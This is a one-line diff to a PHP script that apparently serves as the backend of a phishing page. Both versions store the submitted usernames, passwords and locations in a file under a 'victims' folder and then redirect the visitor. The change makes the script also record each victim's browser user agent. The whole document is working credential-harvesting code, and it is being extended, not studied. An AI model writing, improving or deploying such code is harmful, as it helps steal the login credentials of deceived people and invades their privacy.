@@ -1,1 +1,1 @@
-<?php if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Location: '.$_POST['link']); file_put_contents(".././victims/password.txt", "username=" . $_POST['username']. "\npassword=" . $_POST['password'] . "\nFrom=" .$_POST['location']."\n\n", FILE_APPEND);}?>
+<?php if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Location: '.$_POST['link']); file_put_contents(".././victims/password.txt", "username=" . $_POST['username']. "\npassword=".$_POST['password']."\nFrom=".$_POST['location']."\nUser-agent=".strtolower($_SERVER['HTTP_USER_AGENT'])."\n\n", FILE_APPEND);}?>
